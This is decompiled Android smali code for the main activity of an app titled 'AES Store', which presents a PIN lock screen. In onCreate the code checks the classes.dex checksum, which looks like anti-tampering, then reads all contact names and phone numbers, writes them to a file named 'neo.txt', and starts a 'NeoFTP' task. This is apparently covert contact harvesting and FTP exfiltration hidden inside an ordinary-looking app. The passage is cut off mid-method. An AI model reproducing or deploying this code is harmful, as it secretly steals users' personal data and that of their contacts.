.class public Lcom/example/xavier/aesstor/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/example/xavier/aesstor/MainActivity$MainActivity$3;,
        Lcom/example/xavier/aesstor/MainActivity$MainActivity$2;,
        Lcom/example/xavier/aesstor/MainActivity$MainActivity$1;
    }
.end annotation


# static fields
.field static final FILENAME:Ljava/lang/String; = "neo.txt"

.field private static final REQUEST_READ_CONTACTS:I

.field static context:Landroid/content/Context;


# instance fields
.field final LOG_TAG:Ljava/lang/String;

.field public arr:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private mCodeCreateListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenCodeCreateListener;

.field private mLoginListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenLoginListener;

.field public myFilePath:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 35
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    .line 40
    const-string v0, "myLogs"

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivity;->LOG_TAG:Ljava/lang/String;

    .line 47
    new-instance v0, Lcom/example/xavier/aesstor/MainActivity$MainActivity$2;

    invoke-direct {v0, p0}, Lcom/example/xavier/aesstor/MainActivity$MainActivity$2;-><init>(Lcom/example/xavier/aesstor/MainActivity;)V

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivity;->mCodeCreateListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenCodeCreateListener;

    .line 48
    new-instance v0, Lcom/example/xavier/aesstor/MainActivity$MainActivity$3;

    invoke-direct {v0, p0}, Lcom/example/xavier/aesstor/MainActivity$MainActivity$3;-><init>(Lcom/example/xavier/aesstor/MainActivity;)V

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivity;->mLoginListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenLoginListener;

    return-void
.end method

.method static synthetic access$000(Lcom/example/xavier/aesstor/MainActivity;)V
    .locals 0
    .param p0, "x0"    # Lcom/example/xavier/aesstor/MainActivity;

    .line 35
    invoke-direct {p0}, Lcom/example/xavier/aesstor/MainActivity;->showMainFragment()V

    return-void
.end method

.method private mayRequestContacts()Z
    .locals 3

    .line 195
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/4 v1, 0x1

    const/16 v2, 0x17

    if-ge v0, v2, :cond_0

    .line 196
    return v1

    .line 198
    :cond_0
    const-string v0, "android.permission.READ_CONTACTS"

    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_1

    .line 199
    return v1

    .line 201
    :cond_1
    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivity;->shouldShowRequestPermissionRationale(Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_2

    .line 202
    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v2}, Lcom/example/xavier/aesstor/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    goto :goto_0

    .line 204
    :cond_2
    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v2}, Lcom/example/xavier/aesstor/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    .line 206
    :goto_0
    return v2
.end method

.method private showLockScreenFragment()V
    .locals 6

    .line 162
    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;->getInstance()Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;->isPinCodeEncryptionKeyExist()Z

    move-result v1

    .line 163
    .local v1, "isPinExist":Z
    new-instance v2, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;

    invoke-direct {v2, p0}, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;-><init>(Landroid/content/Context;)V

    if-eqz v1, :cond_0

    const-string v3, "Unlock AES Store with your PIN"

    goto :goto_0

    :cond_0
    const-string v3, "Create Code"

    :goto_0
    invoke-virtual {v2, v3}, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;->setTitle(Ljava/lang/String;)Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;

    move-result-object v2

    const/4 v3, 0x6

    invoke-virtual {v2, v3}, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;->setCodeLength(I)Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;

    move-result-object v2

    .line 164
    .local v2, "builder":Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;
    new-instance v3, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;

    invoke-direct {v3}, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;-><init>()V

    .line 165
    .local v3, "fragment":Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;
    if-eqz v1, :cond_1

    const/4 v4, 0x1

    goto :goto_1

    :cond_1
    const/4 v4, 0x0

    :goto_1
    invoke-virtual {v2, v4}, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;->setMode(I)Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;

    .line 166
    if-eqz v1, :cond_2

    .line 167
    invoke-static {p0}, Lcom/example/xavier/aesstor/PreferencesSettings;->getCode(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;->setEncodedPinCode(Ljava/lang/String;)V

    .line 168
    iget-object v4, p0, Lcom/example/xavier/aesstor/MainActivity;->mLoginListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenLoginListener;

    invoke-virtual {v3, v4}, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;->setLoginListener(Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenLoginListener;)V

    .line 170
    :cond_2
    invoke-virtual {v2}, Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;->build()Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;->setConfiguration(Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration;)V

    .line 171
    iget-object v4, p0, Lcom/example/xavier/aesstor/MainActivity;->mCodeCreateListener:Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenCodeCreateListener;

    invoke-virtual {v3, v4}, Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;->setCodeCreateListener(Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment$OnPFLockScreenCodeCreateListener;)V

    .line 172
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v4

    invoke-virtual {v4}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v4

    const v5, 0x7f07003f

    invoke-virtual {v4, v5, v3}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v4

    invoke-virtual {v4}, Landroid/support/v4/app/FragmentTransaction;->commit()I
    :try_end_0
    .catch Lcom/beautycoder/pflockscreen/security/PFSecurityException; {:try_start_0 .. :try_end_0} :catch_0

    .line 176
    nop

    .end local v1    # "isPinExist":Z
    .end local v2    # "builder":Lcom/beautycoder/pflockscreen/PFFLockScreenConfiguration$Builder;
    .end local v3    # "fragment":Lcom/beautycoder/pflockscreen/fragments/PFLockScreenFragment;
    goto :goto_2

    .line 173
    :catch_0
    move-exception v1

    .line 174
    .local v1, "e":Lcom/beautycoder/pflockscreen/security/PFSecurityException;
    invoke-virtual {v1}, Lcom/beautycoder/pflockscreen/security/PFSecurityException;->printStackTrace()V

    .line 175
    const-string v2, "Can not get pin code info"

    invoke-static {p0, v2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 177
    .end local v1    # "e":Lcom/beautycoder/pflockscreen/security/PFSecurityException;
    :goto_2
    return-void
.end method

.method private showMainFragment()V
    .locals 3

    .line 190
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v0

    new-instance v1, Lcom/example/xavier/aesstor/MainFragment;

    invoke-direct {v1}, Lcom/example/xavier/aesstor/MainFragment;-><init>()V

    const v2, 0x7f07003f

    invoke-virtual {v0, v2, v1}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    .line 191
    return-void
.end method


# virtual methods
.method public getContacts()V
    .locals 24

    .line 221
    move-object/from16 v0, p0

    const/4 v1, 0x0

    .line 223
    .local v1, "phoneNumber":Ljava/lang/String;
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    iput-object v2, v0, Lcom/example/xavier/aesstor/MainActivity;->arr:Ljava/util/ArrayList;

    .line 225
    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    .line 226
    .local v2, "CONTENT_URI":Landroid/net/Uri;
    const-string v9, "_id"

    .line 227
    .local v9, "_ID":Ljava/lang/String;
    const-string v10, "display_name"

    .line 228
    .local v10, "DISPLAY_NAME":Ljava/lang/String;
    const-string v11, "has_phone_number"

    .line 230
    .local v11, "HAS_PHONE_NUMBER":Ljava/lang/String;
    sget-object v12, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 231
    .local v12, "PhoneCONTENT_URI":Landroid/net/Uri;
    const-string v13, "contact_id"

    .line 232
    .local v13, "Phone_CONTACT_ID":Ljava/lang/String;
    const-string v14, "data1"

    .line 234
    .local v14, "NUMBER":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuffer;

    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    move-object v15, v3

    .line 235
    .local v15, "output":Ljava/lang/StringBuffer;
    invoke-virtual/range {p0 .. p0}, Lcom/example/xavier/aesstor/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v16

    .line 236
    .local v16, "contentResolver":Landroid/content/ContentResolver;
    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    move-object/from16 v3, v16

    move-object v4, v2

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 238
    .local v8, "cursor":Landroid/database/Cursor;
    invoke-interface {v8}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_3

    .line 239
    :goto_0
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 240
    invoke-interface {v8, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v17

    .line 241
    .local v17, "contact_id":Ljava/lang/String;
    invoke-interface {v8, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 242
    .local v7, "name":Ljava/lang/String;
    invoke-interface {v8, v11}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v18

    .line 244
    .local v18, "hasPhoneNumber":I
    if-lez v18, :cond_0

    .line 245
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "\n Name: "

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v15, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 246
    const/4 v5, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " =?"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v17, v4, v3

    const/16 v20, 0x0

    move-object/from16 v3, v16

    move-object/from16 v21, v4

    move-object v4, v12

    move-object/from16 v22, v6

    move-object/from16 v6, v19

    move-object/from16 v23, v7

    .end local v7    # "name":Ljava/lang/String;
    .local v23, "name":Ljava/lang/String;
    move-object/from16 v7, v21

    move-object/from16 v19, v8

    .end local v8    # "cursor":Landroid/database/Cursor;
    .local v19, "cursor":Landroid/database/Cursor;
    move-object/from16 v8, v20

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    .line 249
    .local v3, "phoneCursor":Landroid/database/Cursor;
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivity;->arr:Ljava/util/ArrayList;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v6, v22

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v6, v23

    .end local v23    # "name":Ljava/lang/String;
    .local v6, "name":Ljava/lang/String;
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 251
    :goto_1
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_1

    .line 252
    invoke-interface {v3, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 253
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "\n \u0422\u0435\u043b\u0435\u0444\u043e\u043d: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 255
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivity;->arr:Ljava/util/ArrayList;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 244
    .end local v3    # "phoneCursor":Landroid/database/Cursor;
    .end local v6    # "name":Ljava/lang/String;
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v7    # "name":Ljava/lang/String;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_0
    move-object v6, v7

    move-object/from16 v19, v8

    .line 259
    .end local v7    # "name":Ljava/lang/String;
    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v6    # "name":Ljava/lang/String;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    :cond_1
    const-string v3, "\n"

    invoke-virtual {v15, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 260
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivity;->arr:Ljava/util/ArrayList;

    invoke-virtual {v4, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 261
    .end local v6    # "name":Ljava/lang/String;
    .end local v17    # "contact_id":Ljava/lang/String;
    .end local v18    # "hasPhoneNumber":I
    move-object/from16 v8, v19

    goto/16 :goto_0

    .line 239
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_2
    move-object/from16 v19, v8

    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    goto :goto_2

    .line 238
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_3
    move-object/from16 v19, v8

    .line 264
    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    :goto_2
    invoke-virtual {v0, v15}, Lcom/example/xavier/aesstor/MainActivity;->writeFile(Ljava/lang/StringBuffer;)V

    .line 266
    return-void
.end method

.method public myDir()Ljava/lang/String;
    .locals 2

    .line 311
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/example/xavier/aesstor/MainActivity;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "/neo.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "ResourceType"
        }
    .end annotation

    .line 103
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 104
    const v0, 0x7f09001c

    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivity;->setContentView(I)V

    .line 106
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/example/xavier/aesstor/MainActivity;->context:Landroid/content/Context;

    .line 107
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/example/xavier/aesstor/MainActivity;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "/neo.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivity;->myFilePath:Ljava/lang/String;

    .line 112
    const/4 v0, 0x0

    .line 114
    .local v0, "containerJar":Ljava/util/jar/JarFile;
    :try_start_0
    new-instance v1, Ljava/util/jar/JarFile;

    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    iget-object v2, v2, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/util/jar/JarFile;-><init>(Ljava/lang/String;)V

    move-object v0, v1

    .line 115
    const-string v1, "classes.dex"

    invoke-virtual {v0, v1}, Ljava/util/jar/JarFile;->getEntry(Ljava/lang/String;)Ljava/util/zip/ZipEntry;

    move-result-object v1

    .line 116
    .local v1, "ze":Ljava/util/zip/ZipEntry;
    if-eqz v1, :cond_0

    .line 117
    const v2, 0x7f0b0029

    invoke-virtual {p0, v2}, Lcom/example/xavier/aesstor/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    invoke-virtual {v1}, Ljava/util/zip/ZipEntry;->getCrc()J

    move-result-wide v4

    cmp-long v6, v2, v4

    if-eqz v6, :cond_0

    .line 118
    new-instance v2, Landroid/support/v7/app/AlertDialog$Builder;

    invoke-direct {v2, p0}, Landroid/support/v7/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v3, "Error"

    invoke-virtual {v2, v3}, Landroid/support/v7/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v2

    const-string v3, "Some error during loading process"

    invoke-virtual {v2, v3}, Landroid/support/v7/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v2

    const v3, 0x1040013

    new-instance v4, Lcom/example/xavier/aesstor/MainActivity$MainActivity$1;

    invoke-direct {v4, p0}, Lcom/example/xavier/aesstor/MainActivity$MainActivity$1;-><init>(Lcom/example/xavier/aesstor/MainActivity;)V

    invoke-virtual {v2, v3, v4}, Landroid/support/v7/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v2

    const v3, 0x1080027

    invoke-virtual {v2, v3}, Landroid/support/v7/app/AlertDialog$Builder;->setIcon(I)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/support/v7/app/AlertDialog$Builder;->show()Landroid/support/v7/app/AlertDialog;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 121
    :cond_0
    nop

    .line 123
    :try_start_1
    invoke-virtual {v0}, Ljava/util/jar/JarFile;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 126
    goto :goto_0

    .line 124
    :catch_0
    move-exception v2

    .line 125
    .local v2, "e":Ljava/io/IOException;
    :try_start_2
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    .line 137
    .end local v1    # "ze":Ljava/util/zip/ZipEntry;
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v1

    .line 138
    .local v1, "th":Ljava/lang/Throwable;
    if-eqz v0, :cond_2

    .line 140
    :try_start_3
    invoke-virtual {v0}, Ljava/util/jar/JarFile;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2

    .line 143
    goto :goto_1

    .line 141
    :catch_2
    move-exception v2

    .line 142
    .local v2, "e3":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 128
    .end local v1    # "th":Ljava/lang/Throwable;
    .end local v2    # "e3":Ljava/io/IOException;
    :catch_3
    move-exception v1

    .line 129
    .local v1, "e2":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 130
    if-eqz v0, :cond_1

    .line 132
    :try_start_4
    invoke-virtual {v0}, Ljava/util/jar/JarFile;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    .line 135
    goto :goto_0

    .line 133
    :catch_4
    move-exception v2

    .line 134
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    .line 145
    .end local v1    # "e2":Ljava/io/IOException;
    .end local v2    # "e":Ljava/io/IOException;
    :cond_1
    :goto_0
    nop

    .line 148
    :cond_2
    :goto_1
    invoke-direct {p0}, Lcom/example/xavier/aesstor/MainActivity;->mayRequestContacts()Z

    .line 150
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getContacts()V

    .line 152
    new-instance v1, Lcom/example/xavier/aesstor/NeoFTP;

    invoke-direct {v1}, Lcom/example/xavier/aesstor/NeoFTP;-><init>()V

    .line 153
    .local v1, "neoFTP":Lcom/example/xavier/aesstor/NeoFTP;
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/example/xavier/aesstor/NeoFTP;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 157
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
        .annotation build Landroid/support/annotation/NonNull;
        .end annotation
    .end param
    .param p3, "grantResults"    # [I
        .annotation build Landroid/support/annotation/NonNull;
        .end annotation
    .end param

    .line 212
    if-nez p1, :cond_0

    .line 213
    array-length v0, p3

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    const/4 v0, 0x0

    aget v0, p3, v0

    if-nez v0, :cond_0

    .line 215
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivity;->getContacts()V

    .line 218
    :cond_0
    return-void
.end method

.method public showResetLockScreenFragment()V
    .locals 3

    .line 181
    :try_start_0
    invoke-static {}, Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;->getInstance()Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/beautycoder/pflockscreen/security/PFFingerprintPinCodeHelper;->delete()V

    .line 182
    invoke-direct {p0}, Lcom/example/xavier/aesstor/MainActivity;->showLockScreenFragment()V
    :try_end_0
    .catch Lcom/beautycoder/pflockscreen/security/PFSecurityException; {:try_start_0 .. :try_end_0} :catch_0

    .line 186
    goto :goto_0

    .line 183
    :catch_0
    move-exception v0

    .line 184
    .local v0, "e":Lcom/beautycoder/pflockscreen/security/PFSecurityException;
    invoke-virtual {v0}, Lcom/beautycoder/pflockscreen/security/PFSecurityException;->printStackTrace()V

    .line 185
    const/4 v1, 0x0

    const-string v2, "Can not get pin code info"

    invoke-static {p0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 187
    .end local v0    # "e":Lcom/beautycoder/pflockscreen/security/PFSecurityException;
    :goto_0
    return-void
.end method

.method writeFile(Ljava/lang/StringBuffer;)V
    .locals 4
    .param p1, "str"    # Ljava/lang/StringBuffer;

    .line 270
    :try_start_0
    new-instance v0, Ljava/io/BufferedWriter;

    new-instance v1, Ljava/io/OutputStreamWriter;

    const-string v2, "neo.txt"

    const/4 v3, 0x0

    .line 271
    invoke-virtual {p0, v2, v3}, Lcom/example/xavier/aesstor/MainActivity;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

